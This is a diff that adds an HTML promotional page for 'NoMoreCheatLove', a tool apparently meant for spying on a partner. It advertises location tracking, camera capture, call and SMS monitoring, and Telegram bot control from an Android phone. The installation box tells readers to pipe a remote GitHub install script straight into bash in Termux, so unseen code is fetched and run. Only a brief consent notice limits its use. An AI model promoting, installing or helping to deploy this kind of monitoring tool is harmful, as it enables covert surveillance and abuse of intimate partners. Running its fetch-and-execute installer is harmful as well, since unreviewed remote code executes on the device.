@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoMoreCheatLove - Anti-Cheat System</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #0f0f0f;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .install-box {
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        code {
+            background: #333;
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+        .warning {
+            color: #ff4444;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>NoMoreCheatLove</h1>
+            <p>Advanced Anti-Cheat Monitoring System</p>
+        </div>
+
+        <div class="install-box">
+            <h2>🚀 Installation</h2>
+            <p>Run in Termux:</p>
+            <code>curl -sL https://raw.githubusercontent.com/likhonsheikhofficial/NoMoreCheatLove/main/install.sh | bash</code>
+        </div>
+
+        <h2>⚠️ Legal Notice</h2>
+        <p class="warning">This tool must only be used with <strong>explicit consent</strong>. Unauthorized monitoring violates privacy laws.</p>
+
+        <h2>🌟 Features</h2>
+        <ul>
+            <li>📍 Real-time location tracking</li>
+            <li>📸 Front/Rear camera capture</li>
+            <li>📞 Call/SMS monitoring</li>
+            <li>🔔 Notification alerts</li>
+            <li>🤖 Telegram Bot control</li>
+        </ul>
+
+        <h2>📋 Requirements</h2>
+        <ul>
+            <li>Termux (Android)</li>
+            <li>Python 3.8+</li>
+            <li>Telegram Bot Token</li>
+        </ul>
+    </div>
+</body>
+</html>
